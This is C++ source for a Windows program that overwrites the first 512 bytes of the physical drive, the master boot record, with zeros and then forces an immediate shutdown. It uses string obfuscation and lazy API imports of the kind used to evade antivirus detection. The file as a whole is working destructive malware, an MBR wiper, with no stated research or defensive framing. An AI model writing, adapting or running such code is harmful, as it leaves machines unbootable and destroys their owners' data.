#include <Windows.h>
#include <iostream>
#include <string.h>
#include <thread>
#include "lazy_importer.hpp"
#include "xorstr.hpp"

using namespace std;

#define size 512 //default size

int main()
{
    static char success[512]; // if success
    sprintf_s(success, xorstr_("Memory changed!"));

    static char failed[512]; // if failed
    sprintf_s(failed, xorstr_("Program failed!"));

    DWORD change_memory;
    static char data[size]; // @size 512

    ZeroMemory(&data, (sizeof data));

    HANDLE record = CreateFile(xorstr_("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    if (WriteFile(record, data, size, &change_memory, NULL) == TRUE) {

        cout << success; //show message

        std::this_thread::sleep_for(std::chrono::milliseconds(500)); //sleep this process
        LI_FN(system)(xorstr_("shutdown -s -t 1")); //shutdown computer
        throw 42; //terminate this process
    }
    else
    {
        cout << failed; //show message
        std::this_thread::sleep_for(std::chrono::milliseconds(500)); //sleep this process
        throw 42; //terminate this process
    }
    LI_FN(CloseHandle)(record); //close handle

    return EXIT_SUCCESS;
}
